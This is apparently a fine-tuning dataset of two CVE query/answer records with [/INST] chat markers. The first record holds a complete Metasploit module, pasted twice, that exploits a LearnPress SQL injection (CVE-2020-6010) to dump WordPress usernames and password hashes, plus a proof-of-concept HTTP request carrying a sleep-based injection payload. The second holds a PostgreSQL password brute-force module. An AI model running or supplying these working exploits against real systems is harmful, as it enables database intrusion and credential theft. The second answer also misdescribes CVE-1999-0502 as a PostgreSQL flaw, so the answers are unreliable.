{"query": "CVE-2020-6010", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HTTP::Wordpress  include Msf::Auxiliary::Scanner  include Msf::Exploit::SQLi  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Wordpress LearnPress current_items Authenticated SQLi',        'Description' => %q{          LearnPress, a learning management plugin for WordPress,          prior to 3.2.6.8 is affected by an authenticated SQL injection via the          current_items parameter of the post-new.php page.        },        'Author' => [          'h00die', # msf module          'Omri Herscovici', # Discovery and PoC          'Sagi Tzadik', # Discovery and PoC          'nhattruong' # edb poc        ],        'License' => MSF_LICENSE,        'References' => [          ['CVE', '2020-6010'],          ['URL', 'https://research.checkpoint.com/2020/e-learning-platforms-getting-schooled-multiple-vulnerabilities-in-wordpress-most-popular-learning-management-system-plugins/'],          ['EDB', '50137'],          ['WPVDB', '10208']        ],        'Actions' => [          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }]        ],        'DefaultAction' => 'List Users',        'DisclosureDate' => '2020-04-29',        'Notes' => {          'Stability' => [CRASH_SAFE],          'SideEffects' => [IOC_IN_LOGS],          'Reliability' => []        }      )    )    register_options [      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),      OptString.new('USERNAME', [true, 'Valid Username for login', '']),      OptString.new('PASSWORD', [true, 'Valid Password for login', ''])    ]  end  def run_host(ip)    unless wordpress_and_online?      vprint_error('Server not online or not detected as wordpress')      return    end    checkcode = check_plugin_version_from_readme('learnpress', '3.2.6.8')    if checkcode == Msf::Exploit::CheckCode::Safe      vprint_error('LearnPress version not vulnerable')      return    end    print_good('Vulnerable version of LearnPress detected')    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])    if cookie.nil?      vprint_error('Invalid login, check credentials')      return    end    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|      res = send_request_cgi({        'method' => 'POST',        'cookie' => cookie,        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'post-new.php'),        'vars_get' => {          'post_type' => 'lp_order'        },        'vars_post' => {          'type' => 'lp_course',          'context' => 'order-items',          'context_id' => Rex::Text.rand_text_numeric(2, 0), # avoid 0s incase leading 0 gives bad results          'term' => Rex::Text.rand_text_alpha(8),          'paged' => 1,          'lp-ajax' => 'modal_search_items',          'current_items[]' => \"1 AND (SELECT #{Rex::Text.rand_text_numeric(4, 0)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)})\"        }      })      fail_with Failure::Unreachable, 'Connection failed' unless res    end    unless @sqli.test_vulnerable      print_bad(\"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\")      return    end    columns = ['user_login', 'user_pass']    print_status('Enumerating Usernames and Password Hashes')    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)    data.each do |user|      create_credential({        workspace_id: myworkspace_id,        origin_type: :service,        module_fullname: fullname,        username: user[0],        private_type: :nonreplayable_hash,        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),        private_data: user[1],        service_name: 'Wordpress',        address: ip,        port: datastore['RPORT'],        protocol: 'tcp',        status: Metasploit::Model::Login::Status::UNTRIED      })      table << user    end    print_good(table.to_s)  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HTTP::Wordpress  include Msf::Auxiliary::Scanner  include Msf::Exploit::SQLi  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Wordpress LearnPress current_items Authenticated SQLi',        'Description' => %q{          LearnPress, a learning management plugin for WordPress,          prior to 3.2.6.8 is affected by an authenticated SQL injection via the          current_items parameter of the post-new.php page.        },        'Author' => [          'h00die', # msf module          'Omri Herscovici', # Discovery and PoC          'Sagi Tzadik', # Discovery and PoC          'nhattruong' # edb poc        ],        'License' => MSF_LICENSE,        'References' => [          ['CVE', '2020-6010'],          ['URL', 'https://research.checkpoint.com/2020/e-learning-platforms-getting-schooled-multiple-vulnerabilities-in-wordpress-most-popular-learning-management-system-plugins/'],          ['EDB', '50137'],          ['WPVDB', '10208']        ],        'Actions' => [          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }]        ],        'DefaultAction' => 'List Users',        'DisclosureDate' => '2020-04-29',        'Notes' => {          'Stability' => [CRASH_SAFE],          'SideEffects' => [IOC_IN_LOGS],          'Reliability' => []        }      )    )    register_options [      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),      OptString.new('USERNAME', [true, 'Valid Username for login', '']),      OptString.new('PASSWORD', [true, 'Valid Password for login', ''])    ]  end  def run_host(ip)    unless wordpress_and_online?      vprint_error('Server not online or not detected as wordpress')      return    end    checkcode = check_plugin_version_from_readme('learnpress', '3.2.6.8')    if checkcode == Msf::Exploit::CheckCode::Safe      vprint_error('LearnPress version not vulnerable')      return    end    print_good('Vulnerable version of LearnPress detected')    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])    if cookie.nil?      vprint_error('Invalid login, check credentials')      return    end    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|      res = send_request_cgi({        'method' => 'POST',        'cookie' => cookie,        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'post-new.php'),        'vars_get' => {          'post_type' => 'lp_order'        },        'vars_post' => {          'type' => 'lp_course',          'context' => 'order-items',          'context_id' => Rex::Text.rand_text_numeric(2, 0), # avoid 0s incase leading 0 gives bad results          'term' => Rex::Text.rand_text_alpha(8),          'paged' => 1,          'lp-ajax' => 'modal_search_items',          'current_items[]' => \"1 AND (SELECT #{Rex::Text.rand_text_numeric(4, 0)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)})\"        }      })      fail_with Failure::Unreachable, 'Connection failed' unless res    end    unless @sqli.test_vulnerable      print_bad(\"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\")      return    end    columns = ['user_login', 'user_pass']    print_status('Enumerating Usernames and Password Hashes')    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)    data.each do |user|      create_credential({        workspace_id: myworkspace_id,        origin_type: :service,        module_fullname: fullname,        username: user[0],        private_type: :nonreplayable_hash,        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),        private_data: user[1],        service_name: 'Wordpress',        address: ip,        port: datastore['RPORT'],        protocol: 'tcp',        status: Metasploit::Model::Login::Status::UNTRIED      })      table << user    end    print_good(table.to_s)  endendEXPLOIT: # Exploit Title: WordPress Plugin LearnPress 3.2.6.7 - 'current_items' SQL Injection (Authenticated)# Date: 07-17-2021# Exploit Author: nhattruong or nhattruong.blog# Vendor Homepage: https://thimpress.com/learnpress/# Software Link: https://wordpress.org/plugins/learnpress/# Version: < 3.2.6.8# References link: https://wpscan.com/vulnerability/10208# CVE: CVE-2020-6010POC:1. Go to url http://<host>/wp-admin2. Login with a cred3. Execute the payloadPOST /wordpress/wp-admin/post-new.php?post_type=lp_order HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0Accept: application/json, text/plain, */*Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://localhost/wordpress/wp-admin/post-new.php?post_type=lp_orderContent-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestContent-Length: 128Origin: http://localhostConnection: closeCookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=test%7C1626703944%7Ch5yJTmZF2VUp6nuZHvt3WpWHJOGpYRUwaDfRNLd8N3x%7Cf0e96afd20e39e4531756b321160a4929f82f20a3fed8d3c3b682e0ece232e08; wordpress_test_cookie=WP+Cookie+check; wp_learn_press_session_bbfa5b726c6b7a9cf3cda9370be3ee91=80e1cb27266ae862f9e71f90a987f260%7C%7C1626703938%7C%7Cbd6b88d1ae5fd4354f09534ad4971bbc; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=test%7C1626703944%7Ch5yJTmZF2VUp6nuZHvt3WpWHJOGpYRUwaDfRNLd8N3x%7Ce1092ef2869397bd9701ca7f1c6d0399c89459f5221db89c48a53b39b3e8cc2f; wp-settings-time-3=1626531145type=lp_course&context=order-items&context_id=32&term=+test&paged=1&lp-ajax=modal_search_items&current_items[]=1 or sleep(1)-- -# Modify current_items[] as you want       Question: CVE-2020-6010[/INST] CVE-2020-6010 is an authenticated SQL injection vulnerability affecting the LearnPress plugin for WordPress prior to version 3.2.6.8. This vulnerability allows an attacker who has already logged into the WordPress admin panel to execute arbitrary SQL queries through the 'current\\_items' parameter of the '/wp-admin/post-new.php' endpoint.To exploit this vulnerability, an attacker must first gain valid WordPress admin credentials. Once they have obtained these credentials, they can craft a specially crafted query containing malicious SQL statements to be executed against the underlying database. These SQL statements could potentially lead to privilege escalation, data exfiltration, or even complete server compromise.Here's a brief explanation of how the exploit works:1. An attacker logs into the WordPress admin panel using valid credentials.2. They navigate to the '/wp-admin/post-new.php' endpoint and modify the 'current\\_items[]' parameter in the query string to contain their malicious SQL statement.3. When the page loads, the modified SQL statement is executed against the underlying database, allowing the attacker to perform various actions depending on the specific SQL statement used.For instance, an attacker might use a union select query to extract sensitive data such as usernames and password hashes from the database. Alternatively, they might use a more complex query to achieve remote code execution or elevated privileges within the WordPress environment.It's important to note that this vulnerability requires an attacker to already have valid WordPress admin credentials. Therefore, it's crucial to ensure that your WordPress installation is protected with strong passwords and multi-factor authentication wherever possible. Additionally, keeping your plugins up-to-date with the latest patches is essential to mitigate known vulnerabilities like CVE-2020-6010."}
{"query": "CVE-1999-0502", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require 'metasploit/framework/credential_collection'require 'metasploit/framework/login_scanner/postgres'class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::Postgres  include Msf::Auxiliary::AuthBrute  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  # Creates an instance of this module.  def initialize(info = {})    super(update_info(info,      'Name'           => 'PostgreSQL Login Utility',      'Description'    => %q{        This module attempts to authenticate against a PostgreSQL        instance using username and password combinations indicated        by the USER_FILE, PASS_FILE, and USERPASS_FILE options. Note that        passwords may be either plaintext or MD5 formatted hashes.      },      'Author'         => [ 'todb' ],      'License'        => MSF_LICENSE,      'References'     =>        [          [ 'URL', 'https://www.postgresql.org/' ],          [ 'CVE', '1999-0502'], # Weak password          [ 'URL', 'https://hashcat.net/forum/archive/index.php?thread-4148.html' ] # Pass the Hash        ]    ))    register_options(      [        Opt::Proxies,        OptPath.new('USERPASS_FILE',  [ false, \"File containing (space-separated) users and passwords, one pair per line\",          File.join(Msf::Config.data_directory, \"wordlists\", \"postgres_default_userpass.txt\") ]),        OptPath.new('USER_FILE',      [ false, \"File containing users, one per line\",          File.join(Msf::Config.data_directory, \"wordlists\", \"postgres_default_user.txt\") ]),        OptPath.new('PASS_FILE',      [ false, \"File containing passwords, one per line\",          File.join(Msf::Config.data_directory, \"wordlists\", \"postgres_default_pass.txt\") ]),      ])    deregister_options('SQL', 'PASSWORD_SPRAY')  end  # Loops through each host in turn. Note the current IP address is both  # ip and datastore['RHOST']  def run_host(ip)    cred_collection = build_credential_collection(      realm: datastore['DATABASE'],      username: datastore['USERNAME'],      password: datastore['PASSWORD']    )    scanner = Metasploit::Framework::LoginScanner::Postgres.new(      host: ip,      port: rport,      proxies: datastore['PROXIES'],      cred_details: cred_collection,      stop_on_success: datastore['STOP_ON_SUCCESS'],      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],      connection_timeout: 30,      framework: framework,      framework_module: self,    )    scanner.scan! do |result|      credential_data = result.to_h      credential_data.merge!(          module_fullname: self.fullname,          workspace_id: myworkspace_id      )      if result.success?        credential_core = create_credential(credential_data)        credential_data[:core] = credential_core        create_credential_login(credential_data)        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"      else        invalidate_login(credential_data)        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"      end    end  end  # Alias for RHOST  def rhost    datastore['RHOST']  end  # Alias for RPORT  def rport    datastore['RPORT']  endend       Question: CVE-1999-0502 [/INST] CVE-1999-0502 refers to a vulnerability in PostgreSQL related to weak passwords. The exact nature of the vulnerability is described in the references given under the 'References' section in the provided code snippet. The vulnerability affects PostgreSQL instances with weak passwords and can potentially allow unauthorized access to the database. The code snippet includes a module for brute-force attacking PostgreSQL instances using a wordlist of potential usernames and passwords, including support for both plaintext and MD5-hashed passwords."}
